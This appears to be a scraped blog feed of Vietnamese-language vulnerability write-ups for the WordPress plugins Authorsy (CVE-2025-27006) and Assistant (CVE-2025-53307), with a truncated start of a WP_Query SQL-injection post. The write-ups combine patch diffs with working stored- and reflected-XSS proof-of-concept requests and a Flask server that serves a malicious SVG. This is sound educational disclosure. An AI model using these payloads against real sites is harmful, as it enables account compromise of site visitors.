nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\nCVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u0026lt;= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Trong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn Subscriber nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c Unauthenticated. {: .prompt-info }\nRequirements Local WordPress and Debugging Authorsy: v1.0.5(vul) v√† v1.0.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng c√≥ ch·ª©c nƒÉng t√πy ch·ªânh CSS, l∆∞u d·ªØ li·ªáu trong wp_options v√† ch√®n tr·ª±c ti·∫øp v√†o \u0026lt;style\u0026gt; tr√™n trang. Tuy nhi√™n, ng∆∞·ªùi d√πng c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi API ƒë·ªÉ ch·ªânh s·ª≠a d·ªØ li·ªáu CSS m√† kh√¥ng b·ªã ki·ªÉm so√°t quy·ªÅn, d·∫´n ƒë·∫øn nguy c∆° Broken Access Control v√† c√≥ th·ªÉ XSS n·∫øu ch√®n payload ƒë·ªôc h·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file core/settings/api-settings.php v√† core/enqueue-inline/enqueue-inline.php\nFile core/enqueue-inline/enqueue-inline.php\npublic function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } {: file=\u0026ldquo;core/enqueue-inline/enqueue-inline.php v1.0.5\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng tr∆∞·ªõc khi th√™m v√†o HTML kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t, kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá =\u0026gt; d·ªÖ b·ªã XSS.\npublic function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single() \u0026amp;\u0026amp; !empty($ea_custom_css)){ // Additional sanitization for output to prevent XSS $ea_custom_css = wp_strip_all_tags($ea_custom_css); $ea_custom_css = esc_html($ea_custom_css); $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } {: file=\u0026ldquo;core/enqueue-inline/enqueue-inline.php v1.0.5\u0026rdquo; }\nB·∫£n v√° b·∫£o v·ªá d·ªØ li·ªáu b·∫±ng sanitize + escape, ƒë·ªìng th·ªùi ki·ªÉm tra CSS c√≥ t·ªìn t·∫°i tr∆∞·ªõc khi ch√®n.\nFile core/settings/api-settings.php\nclass Api_Settings extends Api { protected $namespace = \u0026#39;authorsy/v1\u0026#39;; protected $rest_base = \u0026#39;settings\u0026#39;; public function register_routes() { register_rest_route( $this-\u0026gt;namespace, $this-\u0026gt;rest_base, [ [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;get_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return true; }, ], [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;update_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return true; }, ], ] ); } public function get_settings() { // other logic } public function update_settings( $request ) { // other logic } } {: file=\u0026ldquo;core/settings/api-settings.php v1.0.5\u0026rdquo; }\n·ª®ng d·ª•ng ƒëƒÉng k√Ω REST API b·∫±ng register_rest_route nh∆∞ng kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p (permission_callback lu√¥n true) =\u0026gt; Ai c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng API n√†y.\nclass Api_Settings extends Api { protected $namespace = \u0026#39;authorsy/v1\u0026#39;; protected $rest_base = \u0026#39;settings\u0026#39;; public function register_routes() { register_rest_route( $this-\u0026gt;namespace, $this-\u0026gt;rest_base, [ [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;get_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return current_user_can(\u0026#39;manage_options\u0026#39;); }, ], [ \u0026#39;methods\u0026#39; =\u0026gt; \\WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;update_settings\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; function () { return current_user_can(\u0026#39;manage_options\u0026#39;); }, ], ] ); } public function get_settings() { // other logic } public function update_settings( $request ) { // other logic } } {: file=\u0026ldquo;core/settings/api-settings.php v1.0.5\u0026rdquo; }\npermission callback ƒë∆∞·ª£c v√°, ch·ªâ admin qu·∫£n l√Ω ƒë∆∞·ª£c settings, b·∫£o v·ªá ch·ªëng Broken Access Control v√† gi√°n ti·∫øp gi·∫£m nguy c∆° XSS.\nHow it work? class Enqueue_Inline { public function init() { add_action(\u0026#39;wp_head\u0026#39;, array($this, \u0026#39;custom_inline_css\u0026#39;)); } // other logic public function custom_inline_css() { $custom_css = \u0026#39;\u0026#39;; // other logic $primary_color = authorsy_get_option(\u0026#39;primary_color\u0026#39;); $ea_custom_css = authorsy_get_option(\u0026#39;ea_custom_css\u0026#39;); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \u0026#34; :root { --ea-color-main: $primary_color; } // other custom \u0026#34; wp_add_inline_style(\u0026#39;authorsy-custom-css\u0026#39;, $custom_css); } } custom_inline_css ƒë∆∞·ª£c d√πng l√†m callback cho hook wp_head. Nghƒ©a l√† khi WP render ph·∫ßn \u0026lt;head\u0026gt; c·ªßa trang (ngay tr∆∞·ªõc \u0026lt;/head\u0026gt;), WP s·∫Ω ch·∫°y custom_inline_css() ƒë·ªÉ th√™m CSS.\nTrong custom_inline_css chu·ªói $custom_css ƒë∆∞·ª£c t·∫°o, d√πng ƒë·ªÉ ch·ª©a:\nN·ªôi dung c√°c bi·∫øn c·∫•u h√¨nh l·∫•y t·ª´ authorsy_get_option() v√† m·ªôt s·ªë logic kh√°c. Ch√∫ng ƒë∆∞·ª£c n·ªëi, th√™m v√†o $custom_css tr∆∞·ªõc khi wp_add_inline_style() ƒë∆∞·ª£c g·ªçi ƒë·ªÉ th√™m v√†o \u0026lt;head\u0026gt;. function authorsy_get_option( $key = \u0026#39;\u0026#39;, $default = false ) { $options = get_option( \u0026#39;authorsy_settings\u0026#39; ); $value = $default; if ( isset( $options[$key] ) ) { $value = ! empty( $options[$key] ) ? $options[$key] : $default; } return $value; } authorsy_get_option l·∫•y m·∫£ng t·∫•t c·∫£ c√°c option c·ªßa plugin Authorsy ƒë∆∞·ª£c l∆∞u trong b·∫£ng wp_options b·∫±ng get_option('authorsy_settings').\nSau ƒë√≥ ki·ªÉm tra xem key c√≥ t·ªìn t·∫°i trong m·∫£ng options kh√¥ng. N·∫øu gi√° tr·ªã kh√¥ng r·ªóng, g√°n v√†o $value, n·∫øu r·ªóng th√¨ gi·ªØ default.\nüëâ V√¨ d·ªØ li·ªáu ƒë∆∞·ª£c l∆∞u tr·ªØ r·ªìi m·ªõi render ra HTML n·∫øn ƒë√¢y l√† Stored XSS\nKhi truy c·∫≠p /wp-json/authorsy/v1/settings v·ªõi method POST =\u0026gt; update_settings ƒë∆∞·ª£c g·ªçi kh√¥ng y√™u c·∫ßu ƒë·∫∑c quy·ªÅn.\npublic function update_settings( $request ) { $options = json_decode( $request-\u0026gt;get_body(), true ); $this-\u0026gt;verify_nonce( $request ); $data = [ \u0026#39;status_code\u0026#39; =\u0026gt; 200, \u0026#39;success\u0026#39; =\u0026gt; 1, \u0026#39;message\u0026#39; =\u0026gt; esc_html__( \u0026#39;Settings successfully updated\u0026#39;, \u0026#39;authorsy\u0026#39; ), \u0026#39;data\u0026#39; =\u0026gt; authorsy_get_settings(), ]; if ( $options ) { foreach ( $options as $key =\u0026gt; $value ) { authorsy_update_option( $key, $value ); } } $data[\u0026#39;data\u0026#39;] = authorsy_get_settings(); return rest_ensure_response( $data ); } {: file=\u0026ldquo;core/settings/api-settings.php v1.0.5\u0026rdquo; }\nH√†m update_settings nh·∫≠n d·ªØ li·ªáu JSON t·ª´ request, decode th√†nh c√°c c·∫∑p key-value v√† c·∫≠p nh·∫≠t ch√∫ng v√†o c∆° s·ªü d·ªØ li·ªáu. Tr∆∞·ªõc khi th·ª±c hi·ªán update, ·ª©ng d·ª•ng g·ªçi $this-\u0026gt;verify_nonce( $request ); ƒë·ªÉ ki·ªÉm tra nonce.\npublic static function verify_nonce($request) { $nonce = $request-\u0026gt;get_header(\u0026#39;X-WP-Nonce\u0026#39;); if (!wp_verify_nonce($nonce, \u0026#39;wp_rest\u0026#39;)) { return new \\WP_Error(\u0026#39;invalid_nonce\u0026#39;, __(\u0026#39;Invalid nonce.\u0026#39;, \u0026#39;authorsy\u0026#39;), [\u0026#39;status\u0026#39; =\u0026gt; 403]); } return true; } {: file=\u0026ldquo;wp-content/plugins/authorsy/base/api.php v1.0.5\u0026rdquo; }\nƒêi·ªÉm quan tr·ªçng:\nKhi nonce kh√¥ng h·ª£p l·ªá, h√†m ch·ªâ tr·∫£ v·ªÅ m·ªôt ƒë·ªëi t∆∞·ª£ng WP_Error, nh∆∞ng kh√¥ng d·ª´ng ch∆∞∆°ng tr√¨nh. Trong update_settings, gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa verify_nonce kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra =\u0026gt; code v·∫´n ti·∫øp t·ª•c th·ª±c hi·ªán c·∫≠p nh·∫≠t. üëâ Nh∆∞ v·∫≠y, ta c√≥ th·ªÉ thay ƒë·ªëi gi√° tr·ªã c·ªßa CSS ch·ª©a XSS payload trong database m√† kh√¥ng c·∫ßn ƒë·∫∑c quy·ªÅn g√¨ c·∫£ =\u0026gt; CSS ƒë∆∞·ª£c th√™m v√†o \u0026lt;head\u0026gt; ch·ª©a m√£ ƒë·ªôc\nExploit Detect XSS G·ª≠i POST request ƒë·∫øn /wp-json/authorsy/v1/settings v·ªõi XSS payload\nPOST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \u0026#34;primary_color\u0026#34;:\u0026#34;\u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;\u0026#34; } Ta ƒë√≥ng th·∫ª \u0026lt;style\u0026gt; (CSS trong head) v√† inject th√™m th·∫ª \u0026lt;script\u0026gt; ch·ª©a XSS payload.\nTruy c·∫≠p m·ªôt trang b·∫•t k·ª≥\nüëâ XSS th√†nh c√¥ng, inspect ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o\n\u0026lt;style\u0026gt; :root { --ea-color-main: \u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;; } \u0026lt;/style\u0026gt; Conclusion L·ªó h·ªïng CVE-2025-27006 trong plugin Authorsy \u0026lt;= 1.0.5 l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh v·ªÅ Broken Access Control k·∫øt h·ª£p v·ªõi XSS. Nguy√™n nh√¢n ch√≠nh l√†:\nREST API kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p: b·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ g·ªçi /wp-json/authorsy/v1/settings ƒë·ªÉ thay ƒë·ªïi c√°c option. CSS t√πy ch·ªânh ch∆∞a ƒë∆∞·ª£c sanitize: gi√° tr·ªã CSS ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o \u0026lt;style\u0026gt; trong \u0026lt;head\u0026gt;, cho ph√©p k·∫ª t·∫•n c√¥ng inject payload \u0026lt;script\u0026gt; th√¥ng qua CSS. Nonce kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng: verify_nonce ch·ªâ tr·∫£ v·ªÅ WP_Error m√† kh√¥ng ngƒÉn code th·ª±c thi, khi·∫øn vi·ªác ki·ªÉm tra b·∫£o m·∫≠t g·∫ßn nh∆∞ v√¥ hi·ªáu. Key takeaways:\nREST API c·∫ßn ki·ªÉm so√°t quy·ªÅn: lu√¥n s·ª≠ d·ª•ng permission_callback h·ª£p l√Ω ƒë·ªÉ ngƒÉn Broken Access Control. Sanitize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi render trong HTML/CSS/JS ƒë·ªÉ ph√≤ng XSS. References Cross-site scripting (XSS) cheat sheet\nWordPress Authorsy Plugin \u0026lt;= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","permalink":"//localhost:1313/vi/posts/2025-09-17-cve-2025-27006/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAuthorsy\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.0.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-27006\"\u003eCVE-2025-27006\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/authorsy/\"\u003eWordPress Authorsy Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: Cross Site Scripting\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.0.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (6.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOWASP Top 10\u003c/strong\u003e: A1: Broken Access Control\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eTrong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn \u003cstrong\u003eSubscriber\u003c/strong\u003e nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c \u003cstrong\u003eUnauthenticated\u003c/strong\u003e.\n{: .prompt-info }\u003c/p\u003e","title":"CVE-2025-27006"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Assistant c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\nCVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u0026lt;= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Assistant: v1.5.2(vul) v√† v1.5.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL m√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =\u0026gt; g√¢y ra l·ªó h·ªïng XSS.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.\nTrong tr∆∞·ªùng h·ª£p n√†y, s·ª± kh√°c bi·ªát gi·ªØa 2 phi√™n b·∫£n kh√° nhi·ªÅu, ƒë·ªÉ thu·∫≠n l·ª£i cho vi·ªác truy v·∫øt, ta c√≥ th·ªÉ xem change log ƒë·ªÉ bi·∫øt b·∫£n v√° l·ªó h·ªïng XSS ·ªü ƒë√¢u:\nChangelog 1.5.3 ( 2025-09-08 ) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \u0026#34;image proxy\u0026#34; üëâ L·ªó h·ªóng n·∫±m trong file backend/src/Hooks/ImageProxy.php, ta quan s√°t s·ª± kh√°c bi·ªát c·ªßa 2 phi√™n b·∫£n:\nS·ª± thay ƒë·ªïi x·∫£y ra ·ªü h√†m render_image v·ªõi ch·ª©c nƒÉng:\nNh·∫≠n tham s·ªë url t·ª´ query string ($_GET['url']). G·ª≠i request t·ª´ server ƒë·∫øn URL ƒë√≥ ƒë·ªÉ t·∫£i n·ªôi dung. Ch·ªëng ssrf b·∫±ng wp_safe_remote_get. N·∫øu n·ªôi dung c√≥ header Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/, th√¨: G·ª≠i l·∫°i header Content-Type ƒë√≥ cho client. In (echo) to√†n b·ªô n·ªôi dung file ra cho tr√¨nh duy·ªát. Tr√¨nh duy·ªát hi·ªÉn th·ªã h√¨nh ·∫£nh kh√¥ng ph·∫£i tr·ª±c ti·∫øp t·ª´ ngu·ªìn g·ªëc m√† th√¥ng qua server WordPress. SVG c≈©ng c√≥ Content-Type b·∫Øt ƒë·∫ßu b·∫±ng image/ v√† c√≥ th·ªÉ ch·ª©a m√£ JavaScript b√™n trong =\u0026gt; XSS c√≥ th·ªÉ x·∫£y ra. {: .prompt-tip }\nB·∫£n v√° ƒë√£ th√™m m·ªôt l·ªõp ki·ªÉm tra MIME type th·ª±c s·ª± c·ªßa file ƒë·ªÉ tr√°nh k·ªãch b·∫£n XSS b·∫±ng SVG hay file gi·∫£ m·∫°o.\n$filesystem = self::filesystem(); $tmpfile = tempnam( \u0026#39;/tmp\u0026#39;, \u0026#39;assistant\u0026#39; ); $filesystem-\u0026gt;put_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u0026gt;delete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() s·ª≠ d·ª•ng h√†m x·ª≠ l√Ω ·∫£nh n·ªôi b·ªô (d·ª±a tr√™n d·ªØ li·ªáu binary c·ªßa file) ƒë·ªÉ x√°c ƒë·ªãnh MIME th·ª±c s·ª±.\nN·∫øu k·∫øt qu·∫£ kh√¥ng ph·∫£i l√† ·∫£nh h·ª£p l·ªá =\u0026gt; return false.\nHow it work? Trong __construct c·ªßa class ImageProxy, ph∆∞∆°ng th·ª©c render_image() ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa action hook 'init'. Hook 'init' ƒë∆∞·ª£c th·ª±c thi r·∫•t s·ªõm trong qu√° tr√¨nh load WordPress, sau khi c√°c ƒë·ªëi t∆∞·ª£ng core ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng tr∆∞·ªõc khi g·ª≠i output ra tr√¨nh duy·ªát.\nrender_image ch·ªâ ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ quy·ªÅn ch·ªânh s·ª≠a b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c v√† tham s·ªë $_GET['fl_asst_image_proxy'] t·ªìn t·∫°i.\nüëâ Khi truy c·∫≠p /wp-admin/?fl_asst_image_proxy=value1\u0026amp;url=http://yoursite/image-path th√¨ render_image s·∫Ω ƒë∆∞·ª£c g·ªçi v√† tr·∫£ v·ªÅ n·ªôi dung h√¨nh ·∫£nh cho tr√¨nh duy·ªát hi·ªÉn th·ªã.\nExploit Detect XSS T·∫°o 1 trang web ƒë∆°n gi·∫£n tr·∫£ v·ªÅ n·ªôi dung SVG ch·ª©a XSS payload\nfrom flask import Flask, Response app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def home(): return \u0026#39;Hello, World!\u0026#39; @app.route(\u0026#39;/svg\u0026#39;) def about(): svg = \u0026#34;\u0026#34;\u0026#34;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt; \u0026lt;/svg\u0026gt;\u0026#34;\u0026#34;\u0026#34; return Response(svg, mimetype=\u0026#34;image/svg+xml\u0026#34;) {: file=\u0026ldquo;api/index.py\u0026rdquo;}\nG·ª≠i request ch·ª©a url param tr·ªè ƒë·∫øn https://yoursite/svg\nhttp://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026amp;url=https://yoursite/svg üëâ Th√†nh c√¥ng v·ªõi Unauthenticated v√¨ ch·ªâ c·∫ßn ng∆∞·ªùi d√πng c√≥ quy·ªÅn, khi truy c·∫≠p url =\u0026gt; XSS x·∫£y ra tr√™n tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n. Attacker kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p.\nConclusion L·ªó h·ªïng CVE-2025-53307 trong plugin WordPress Assistant (\u0026lt;= v1.5.2) cho ph√©p XSS th√¥ng qua render_image() v√¨ kh√¥ng ki·ªÉm tra MIME type th·ª±c c·ªßa file. B·∫£n v√° v1.5.3 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch x√°c th·ª±c n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ tr√¨nh duy·ªát.\nKey takeaways:\nKh√¥ng tin c·∫≠y v√†o Content-Type header t·ª´ HTTP response. Lu√¥n x√°c th·ª±c MIME type th·ª±c s·ª± c·ªßa file. References Cross-site scripting (XSS) cheat sheet\nWordPress WordPress Assistant Plugin \u0026lt;= 1.5.2 is vulnerable to Cross Site Scripting (XSS)\n","permalink":"//localhost:1313/vi/posts/2025-09-16-cve-2025-53307/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAssistant\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.6.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-53307\"\u003eCVE-2025-53307\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/assistant/\"\u003eWordPress Assistant Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: Cross Site Scripting\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.5.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAssistant\u003c/strong\u003e:  v1.5.2(vul) v√† v1.5.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL \u003cstrong\u003em√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type\u003c/strong\u003e. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc =\u0026gt; g√¢y ra l·ªó h·ªïng XSS.\u003c/p\u003e","title":"CVE-2025-53307"},{"content":"Introduction Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra SQL Injection th√¥ng qua c√°c plugin ho·∫∑c theme s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n 5.8.3. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37.\nCVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ‚â§ version \u0026lt; 5.8.3 CVSS severity: High (8.0) Requirements Local WordPress and Debugging WordPress: v5.8.2(vul) Setup Required PHP Version WordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress:\nM·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi. N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© =\u0026gt; s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c. Ng∆∞·ª£c 